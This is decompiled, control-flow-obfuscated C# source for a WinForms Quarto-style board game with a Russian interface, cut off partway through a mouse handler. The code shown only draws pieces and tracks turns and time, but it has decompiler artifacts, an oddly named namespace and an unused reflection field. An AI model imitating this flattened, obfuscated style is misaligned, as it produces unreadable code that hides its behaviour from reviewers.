using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 149115628;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x1251B8A1u) % 6u)
					{
					case 5u:
						num = (int)(num2 * 1260819426) ^ -671565368;
						continue;
					case 2u:
						Big = big;
						num = ((int)num2 * -983654059) ^ -2065056083;
						continue;
					case 1u:
						Dark = dark;
						num = ((int)num2 * -786183296) ^ 0x57D88AAF;
						continue;
					case 0u:
						Square = square;
						num = (int)((num2 * 1025827017) ^ 0x59610E84);
						continue;
					case 4u:
						break;
					default:
						Point = point;
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -271749383;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x860A1EC8u) % 4u)
					{
					case 3u:
						Dark = copy.Dark;
						Big = copy.Big;
						Square = copy.Square;
						Point = copy.Point;
						num = ((int)num2 * -116502285) ^ 0x156931CD;
						continue;
					case 1u:
						num = ((int)num2 * -1798255174) ^ -1197217843;
						continue;
					default:
						return;
					case 2u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		int num7 = default(int);
		int num9 = default(int);
		double num6 = default(double);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 1579805343;
			while (true)
			{
				uint num2;
				double num5;
				PictureBox[,] array;
				int num8;
				int num10;
				PictureBox obj;
				switch ((num2 = (uint)num ^ 0x14BAD640u) % 21u)
				{
				case 20u:
					num = (int)(num2 * 246439908) ^ -150058610;
					continue;
				case 19u:
					num5 = 4.1;
					goto IL_0041;
				case 18u:
				{
					PictureBox[,] array2 = borderBox;
					int num11 = num7;
					int num12 = num9;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num9 + num6) * (double)size), 1 + num7 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num11, num12] = obj2;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num7, num9]);
					num = ((int)num2 * -1524266424) ^ -1727745077;
					continue;
				}
				case 17u:
					num9 = 0;
					num = 386712185;
					continue;
				case 16u:
				{
					int num13;
					int num14;
					if (!flag2)
					{
						num13 = 1257518621;
						num14 = 1257518621;
					}
					else
					{
						num13 = 2123274904;
						num14 = 2123274904;
					}
					num = num13 ^ ((int)num2 * -533138549);
					continue;
				}
				case 15u:
					if (num9 >= 2)
					{
						num = (int)(num2 * 1719799674) ^ -1462069618;
						continue;
					}
					num5 = 0.0;
					goto IL_0041;
				case 14u:
					Form1.smethod_6((Control)(object)pictureBox[num7, num9], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -872719567) ^ -2029701560;
					continue;
				case 13u:
					num7++;
					num = ((int)num2 * -1351796197) ^ 0x7717F619;
					continue;
				case 12u:
					num = ((int)num2 * -1700700932) ^ -744207997;
					continue;
				case 11u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					pictureBox = new PictureBox[4, 4];
					borderBox = new PictureBox[4, 4];
					num7 = 0;
					num = ((int)num2 * -1647101317) ^ -1537166018;
					continue;
				case 10u:
					flag2 = num7 < 4;
					num = 2082507642;
					continue;
				case 9u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num7, num9]);
					num = (int)((num2 * 2085183472) ^ 0xC529D56);
					continue;
				case 8u:
					num9++;
					num = ((int)num2 * -2093135466) ^ -131659907;
					continue;
				case 7u:
					flag = num9 < 4;
					num = 940917551;
					continue;
				case 5u:
					num = ((int)num2 * -1945925031) ^ -2048696316;
					continue;
				case 3u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -1264968821) ^ 0x2DAEDD6E;
					continue;
				}
				case 2u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -452564863;
						num4 = -452564863;
					}
					else
					{
						num3 = -1988639295;
						num4 = -1988639295;
					}
					num = num3 ^ (int)(num2 * 116213729);
					continue;
				}
				case 1u:
					InitializeComponent();
					num = (int)((num2 * 465618347) ^ 0x5BAA086A);
					continue;
				case 0u:
					num = 461682397;
					continue;
				default:
					return;
				case 4u:
					break;
				case 6u:
					return;
					IL_0041:
					num6 = num5;
					array = pictureBox;
					num8 = num7;
					num10 = num9;
					obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num9 + num6) * (double)size), 4 + num7 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num8, num10] = obj;
					num = 1582792245;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -950540896;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC8CD6F7Cu) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = (int)((num2 * 777756575) ^ 0x4D64B486);
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 299185717;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x54B6D6F0u) % 9u)
				{
				case 8u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 2125682768;
					continue;
				}
				case 7u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1401190105;
						num4 = -1401190105;
					}
					else
					{
						num3 = -2085054169;
						num4 = -2085054169;
					}
					num = num3 ^ ((int)num2 * -769279295);
					continue;
				}
				case 6u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 672205972) ^ -1467943447;
					continue;
				case 5u:
					num = (int)(num2 * 1936083212) ^ -1384146776;
					continue;
				case 4u:
					num = ((int)num2 * -1946652339) ^ 0x215179B4;
					continue;
				case 2u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 873299129;
					continue;
				case 1u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 404222754) ^ -2006544289;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 995737832;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x311DAD98u) % 18u)
				{
				case 17u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					num = ((int)num2 * -1436173477) ^ -1449174303;
					continue;
				case 16u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1393691448) ^ 0x11A4544E;
					continue;
				case 15u:
				{
					int num7;
					if (num4 < 4)
					{
						num = 1821000151;
						num7 = 1821000151;
					}
					else
					{
						num = 1017013418;
						num7 = 1017013418;
					}
					continue;
				}
				case 14u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num4++;
					num = ((int)num2 * -1789914437) ^ -174987525;
					continue;
				case 13u:
					num = 1950095327;
					continue;
				case 12u:
					Paint_Storage();
					num = (int)((num2 * 534943299) ^ 0xC21FABA);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 568065759) ^ -807839939;
					continue;
				case 10u:
					num = (int)(num2 * 1441341661) ^ -1830242858;
					continue;
				case 9u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1362154598;
						num6 = 1362154598;
					}
					else
					{
						num5 = 2046456771;
						num6 = 2046456771;
					}
					num = num5 ^ (int)(num2 * 649823261);
					continue;
				}
				case 8u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = (int)(num2 * 1386700550) ^ -1785703411;
					continue;
				case 7u:
					flag = num3 < 4;
					num = 2054901933;
					continue;
				case 6u:
					Paint_Board();
					num = ((int)num2 * -1714998540) ^ 0x62C30EE7;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1304472914) ^ -674851395;
					continue;
				case 3u:
					num4 = 0;
					num = 1314598217;
					continue;
				case 2u:
					num3++;
					num = (int)(num2 * 1011302088) ^ -1923465283;
					continue;
				case 1u:
					num = (int)((num2 * 965170103) ^ 0x24079392);
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		float num3 = default(float);
		int num4 = default(int);
		float num6 = default(float);
		float num17 = default(float);
		bool square = default(bool);
		Brush brush_ = default(Brush);
		float num13 = default(float);
		float num10 = default(float);
		bool flag = default(bool);
		bool point = default(bool);
		while (true)
		{
			int num = -1845743432;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF92498F5u) % 37u)
				{
				case 36u:
					num5++;
					num = (int)((num2 * 1099837164) ^ 0x6C2CD65);
					continue;
				case 35u:
					num = (int)(num2 * 1093009529) ^ -316634189;
					continue;
				case 34u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -142409811) ^ 0x6405B7AC;
					continue;
				case 32u:
					num = (int)(num2 * 300009976) ^ -501675659;
					continue;
				case 31u:
					num6 = num17 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num5, num4].Square;
					num = ((int)num2 * -1402348217) ^ 0x2DC5A943;
					continue;
				case 30u:
					brush_ = Form1.smethod_26();
					num = -1915395031;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 962478430) ^ -1763463662;
					continue;
				case 28u:
					num13 = 1f;
					num = (int)((num2 * 935709616) ^ 0x5E2D0DE8);
					continue;
				case 27u:
					num4++;
					num = (int)((num2 * 898774234) ^ 0x30676C13);
					continue;
				case 26u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -1246816421) ^ -1859285129;
					continue;
				case 25u:
					num = (int)(num2 * 1728216511) ^ -1679858471;
					continue;
				case 24u:
					num10 = 1f - num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1102510454;
					continue;
				case 23u:
					num10 = 1f - num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num3 = (float)size * (num10 / 2f);
					num = -1097236174;
					continue;
				case 22u:
				{
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					int num9;
					if (board[num5, num4] == null)
					{
						num = -396212700;
						num9 = -396212700;
					}
					else
					{
						num = -934727107;
						num9 = -934727107;
					}
					continue;
				}
				case 21u:
					num5 = 0;
					num = ((int)num2 * -221118132) ^ 0x451998EC;
					continue;
				case 20u:
					num = -396212700;
					continue;
				case 19u:
					num6 = num17 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 964138402) ^ 0x5ADA4C9B);
					continue;
				case 18u:
				{
					int num20;
					if (board[num5, num4].Big)
					{
						num = -1644807559;
						num20 = -1644807559;
					}
					else
					{
						num = -1976383663;
						num20 = -1976383663;
					}
					continue;
				}
				case 17u:
					num = (int)(num2 * 17137996) ^ -1583557595;
					continue;
				case 16u:
					num4 = 0;
					num = -613348057;
					continue;
				case 15u:
					flag = num4 < 4;
					num = -715226886;
					continue;
				case 14u:
				{
					int num18;
					int num19;
					if (!board[num5, num4].Dark)
					{
						num18 = -3228211;
						num19 = -3228211;
					}
					else
					{
						num18 = -835410176;
						num19 = -835410176;
					}
					num = num18 ^ (int)(num2 * 209356236);
					continue;
				}
				case 13u:
					point = board[num5, num4].Point;
					num = ((int)num2 * -1637558305) ^ -2146976919;
					continue;
				case 12u:
					num17 = (float)size * num13;
					num = (int)(num2 * 1272150209) ^ -100757023;
					continue;
				case 11u:
					num = (int)(num2 * 1615509750) ^ -709144511;
					continue;
				case 10u:
					num = -2008770490;
					continue;
				case 8u:
				{
					int num16;
					if (num5 < 4)
					{
						num = -1614633083;
						num16 = -1614633083;
					}
					else
					{
						num = -1715666066;
						num16 = -1715666066;
					}
					continue;
				}
				case 7u:
				{
					int num14;
					int num15;
					if (!point)
					{
						num14 = 288691417;
						num15 = 288691417;
					}
					else
					{
						num14 = 1481595308;
						num15 = 1481595308;
					}
					num = num14 ^ (int)(num2 * 1195091318);
					continue;
				}
				case 6u:
					num13 = 0.7f;
					num = -547501656;
					continue;
				case 5u:
				{
					int num11;
					int num12;
					if (!square)
					{
						num11 = -1655484625;
						num12 = -1655484625;
					}
					else
					{
						num11 = -1226896309;
						num12 = -1226896309;
					}
					num = num11 ^ ((int)num2 * -1336320615);
					continue;
				}
				case 4u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 2053309421) ^ -1778298174;
					continue;
				case 3u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -2066775914) ^ -1113509017;
					continue;
				case 2u:
					num3 = (float)size * (num10 / 2f);
					num = ((int)num2 * -2008329721) ^ 0x17417E9F;
					continue;
				case 1u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = -638526825;
						num8 = -638526825;
					}
					else
					{
						num7 = -1448200621;
						num8 = -1448200621;
					}
					num = num7 ^ (int)(num2 * 68937716);
					continue;
				}
				case 0u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = -244682703;
					continue;
				default:
					return;
				case 9u:
					break;
				case 33u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		Brush brush_ = default(Brush);
		int num6 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		bool flag4 = default(bool);
		float num7 = default(float);
		float num10 = default(float);
		float num11 = default(float);
		float num8 = default(float);
		float num9 = default(float);
		bool flag3 = default(bool);
		bool big = default(bool);
		bool dark = default(bool);
		while (true)
		{
			bool flag = num < 4;
			int num2 = -1487907094;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xC26BC0D8u) % 37u)
				{
				case 36u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 1981390085) ^ 0x3699EC73);
					continue;
				case 35u:
					Form1.smethod_20(pictureBox[num, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num6]), Form1.smethod_16((Control)(object)pictureBox[num, num6])));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num6]));
					num2 = (int)((num3 * 1329839594) ^ 0xD306D9);
					continue;
				case 34u:
					flag2 = storage[num, num6] != null;
					num2 = -572024504;
					continue;
				case 33u:
					flag4 = num6 < 4;
					num2 = -1577785431;
					continue;
				case 32u:
					num7 = 1f;
					num2 = ((int)num3 * -1310708430) ^ -1022390305;
					continue;
				case 31u:
				{
					int num22;
					int num23;
					if (!flag)
					{
						num22 = 369488201;
						num23 = 369488201;
					}
					else
					{
						num22 = 986763100;
						num23 = 986763100;
					}
					num2 = num22 ^ ((int)num3 * -521565364);
					continue;
				}
				case 30u:
					num6++;
					num2 = -368493116;
					continue;
				case 29u:
					Form1.smethod_28(graphics_, brush_, num10, num10, num11, num11);
					num2 = (int)((num3 * 1221770616) ^ 0x4645C580);
					continue;
				case 28u:
					num10 = (float)size * (num8 / 2f) - 4f;
					num11 = num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = (int)((num3 * 1102007828) ^ 0x575B8520);
					continue;
				case 27u:
					num++;
					num2 = (int)((num3 * 2035693056) ^ 0x30EB5F8F);
					continue;
				case 26u:
				{
					int num14;
					int num15;
					if (storage[num, num6].Point)
					{
						num14 = 860997743;
						num15 = 860997743;
					}
					else
					{
						num14 = 1768981386;
						num15 = 1768981386;
					}
					num2 = num14 ^ ((int)num3 * -1858513588);
					continue;
				}
				case 25u:
					num2 = ((int)num3 * -302355196) ^ -2069630984;
					continue;
				case 24u:
					num2 = (int)(num3 * 1674537470) ^ -781778716;
					continue;
				case 23u:
					Form1.smethod_30((Control)(object)pictureBox[num, num6]);
					num2 = -1892100604;
					continue;
				case 22u:
					num8 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * num7;
					num2 = -1942351214;
					continue;
				case 21u:
					brush_ = Form1.smethod_26();
					num2 = -1505915925;
					continue;
				case 20u:
				{
					int num20;
					int num21;
					if (!flag3)
					{
						num20 = -1272521908;
						num21 = -1272521908;
					}
					else
					{
						num20 = -649001433;
						num21 = -649001433;
					}
					num2 = num20 ^ ((int)num3 * -1755157027);
					continue;
				}
				case 19u:
				{
					int num18;
					int num19;
					if (big)
					{
						num18 = -350026281;
						num19 = -350026281;
					}
					else
					{
						num18 = -1458286367;
						num19 = -1458286367;
					}
					num2 = num18 ^ ((int)num3 * -821081967);
					continue;
				}
				case 18u:
					num2 = (int)((num3 * 1160014180) ^ 0x6C325D2E);
					continue;
				case 17u:
					num10 = (float)size * (num8 / 2f) - 4f;
					num2 = ((int)num3 * -2104829400) ^ -1283628837;
					continue;
				case 15u:
					num6 = 0;
					num2 = -1446587992;
					continue;
				case 14u:
					num11 = num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -2043782737) ^ 0x62EEF878;
					continue;
				case 13u:
					num8 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -2132431354;
					continue;
				case 12u:
				{
					int num16;
					int num17;
					if (!flag4)
					{
						num16 = 692061006;
						num17 = 692061006;
					}
					else
					{
						num16 = 190116353;
						num17 = 190116353;
					}
					num2 = num16 ^ ((int)num3 * -1106615735);
					continue;
				}
				case 11u:
					Form1.smethod_24(graphics_, brush_, num10, num10, num11, num11);
					num2 = -1835575472;
					continue;
				case 10u:
					num7 = 0.7f;
					num2 = -44129196;
					continue;
				case 9u:
					big = storage[num, num6].Big;
					num2 = -1085094495;
					continue;
				case 7u:
					flag3 = num6 < 2;
					num2 = (int)(num3 * 953480657) ^ -763811099;
					continue;
				case 6u:
					num2 = ((int)num3 * -96669275) ^ -484210261;
					continue;
				case 5u:
					dark = storage[num, num6].Dark;
					num2 = ((int)num3 * -549834046) ^ -1023573762;
					continue;
				case 4u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = 143189092;
						num13 = 143189092;
					}
					else
					{
						num12 = 1598291757;
						num13 = 1598291757;
					}
					num2 = num12 ^ ((int)num3 * -384091767);
					continue;
				}
				case 3u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num10, num10, num11, num11);
					num2 = ((int)num3 * -605975337) ^ -795281381;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (dark)
					{
						num4 = -2092759996;
						num5 = -2092759996;
					}
					else
					{
						num4 = -522603993;
						num5 = -522603993;
					}
					num2 = num4 ^ (int)(num3 * 851086453);
					continue;
				}
				case 1u:
					num2 = (int)(num3 * 1995031296) ^ -943883203;
					continue;
				case 0u:
					num2 = -512789628;
					continue;
				default:
					return;
				case 8u:
					break;
				case 16u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 136349229;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x22724255u) % 32u)
				{
				case 31u:
					step = 0;
					num = ((int)num2 * -338698410) ^ -201505993;
					continue;
				case 30u:
					num = (int)(num2 * 827605451) ^ -369167726;
					continue;
				case 29u:
					num = (int)((num2 * 965672282) ^ 0x286F9B56);
					continue;
				case 28u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1553756252;
					continue;
				case 27u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = -864402524;
						num10 = -864402524;
					}
					else
					{
						num9 = -636109005;
						num10 = -636109005;
					}
					num = num9 ^ ((int)num2 * -1188009501);
					continue;
				}
				case 25u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 496887856) ^ -1946532112;
					continue;
				case 24u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -537010367) ^ -1962701520;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 1551839307;
					continue;
				case 22u:
					num = ((int)num2 * -1188186348) ^ 0x5E61C72A;
					continue;
				case 21u:
					num = ((int)num2 * -451839673) ^ 0x5C53DBC;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 860454499) ^ 0x6637BA76);
					continue;
				case 18u:
					num5 = Form1.smethod_33(rnd, 4);
					num6 = Form1.smethod_33(rnd, 4);
					num = 1110607504;
					continue;
				case 17u:
				{
					int num11;
					int num12;
					if (turn)
					{
						num11 = 921113188;
						num12 = 921113188;
					}
					else
					{
						num11 = 262643901;
						num12 = 262643901;
					}
					num = num11 ^ ((int)num2 * -1668517990);
					continue;
				}
				case 16u:
					num = ((int)num2 * -376867494) ^ -1890569908;
					continue;
				case 15u:
					flag2 = num3 < 4;
					num = 320261279;
					continue;
				case 14u:
					num = ((int)num2 * -308454472) ^ -1323339655;
					continue;
				case 13u:
					num4++;
					num = ((int)num2 * -1302079878) ^ -2140442592;
					continue;
				case 12u:
					num = ((int)num2 * -1861285946) ^ -2067915214;
					continue;
				case 11u:
					num3 = 0;
					num = ((int)num2 * -1655933638) ^ -921620569;
					continue;
				case 10u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -1025108765;
						num8 = -1025108765;
					}
					else
					{
						num7 = -1468840874;
						num8 = -1468840874;
					}
					num = num7 ^ (int)(num2 * 1458065661);
					continue;
				}
				case 9u:
					num = ((int)num2 * -37117156) ^ -257153363;
					continue;
				case 8u:
					num = (int)(num2 * 1424020497) ^ -1082851853;
					continue;
				case 7u:
					flag = num4 < 4;
					num = 57318382;
					continue;
				case 6u:
					num = (int)((num2 * 1655913979) ^ 0x1F25ADCB);
					continue;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Blue);
					num = (int)((num2 * 1797931677) ^ 0x2A3EE207);
					continue;
				case 4u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -1116397358) ^ 0x50E2048D;
					continue;
				case 3u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -119292408) ^ -604415057;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)(num2 * 718156656) ^ -597776653;
					continue;
				case 1u:
					num4 = 0;
					num = 1077473443;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 1276698583) ^ -1306706022;
					continue;
				default:
					return;
				case 19u:
					break;
				case 26u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = -822009177;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCF4B2051u) % 4u)
				{
				case 2u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 485245888) ^ -142738764;
					continue;
				case 1u:
					num = (int)((num2 * 802022474) ^ 0x3AEC013F);
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		int num = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
		bool flag3 = default(bool);
		int num5 = default(int);
		bool flag4 = default(bool);
		int num6 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = -1974731770;
			while (true)
			{
				uint num3;
				int num9;
				switch ((num3 = (uint)num2 ^ 0xFB564792u) % 21u)
				{
				case 19u:
					flag3 = num5 < 4;
					num2 = -1387945748;
					continue;
				case 18u:
					flag4 = num6 < 4;
					num2 = -1513297252;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num2 = (int)(num3 * 1197452288) ^ -1321102077;
					continue;
				case 16u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_009b;
				case 14u:
				{
					int num14;
					int num15;
					if (!flag2)
					{
						num14 = -1779097681;
						num15 = -1779097681;
					}
					else
					{
						num14 = -123478993;
						num15 = -123478993;
					}
					num2 = num14 ^ (int)(num3 * 77248890);
					continue;
				}
				case 13u:
					num6++;
					num2 = ((int)num3 * -1973068397) ^ -124954985;
					continue;
				case 12u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = -2069436999;
						num11 = -2069436999;
					}
					else
					{
						num10 = -1417922977;
						num11 = -1417922977;
					}
					num2 = num10 ^ (int)(num3 * 1004510888);
					continue;
				}
				case 11u:
					if (storage[num, num4] != null)
					{
						num2 = -57722097;
						continue;
					}
					num9 = 0;
					goto IL_009b;
				case 10u:
					num6 = 0;
					num2 = (int)(num3 * 455979362) ^ -234423773;
					continue;
				case 9u:
				{
					int num12;
					int num13;
					if (flag4)
					{
						num12 = 383688552;
						num13 = 383688552;
					}
					else
					{
						num12 = 256583966;
						num13 = 256583966;
					}
					num2 = num12 ^ ((int)num3 * -1794419272);
					continue;
				}
				case 8u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 1838895742;
						num8 = 1838895742;
					}
					else
					{
						num7 = 1107066859;
						num8 = 1107066859;
					}
					num2 = num7 ^ ((int)num3 * -1211213915);
					continue;
				}
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num6, num5], Color.White);
					num5++;
					num2 = -1325106213;
					continue;
				case 6u:
					num5 = 0;
					num2 = -1325106213;
					continue;
				case 5u:
					num2 = (int)(num3 * 1949002766) ^ -1100866852;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num, num4], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num2 = (int)((num3 * 444803509) ^ 0x628405F6);
					continue;
				case 3u:
					num4 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).X / size;
					num2 = ((int)num3 * -1281858608) ^ -221034596;
					continue;
				case 2u:
					num4 -= 4;
					num2 = (int)((num3 * 1351565250) ^ 0x5B052CF8);
					continue;
				case 1u:
					num2 = (int)(num3 * 575316257) ^ -356911342;
					continue;
				case 0u:
					flag = num4 > 1;
					num2 = (int)(num3 * 1642926699) ^ -1639362611;
					continue;
				default:
					return;
				case 20u:
					break;
				case 15u:
					return;
					IL_009b:
					flag2 = (byte)num9 != 0;
					num2 = -1170849684;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cc: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num2 = Form1.smethod_39(e) / size;
		int num5 = default(int);
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num3 = -325399166;
			while (true)
			{
				uint num4;
				int num7;
				switch ((num4 = (uint)num3 ^ 0xC5AC6C69u) % 25u)
				{
				case 24u:
					num3 = ((int)num4 * -251264532) ^ -231927351;
					continue;
				case 23u:
				{
					int num8;
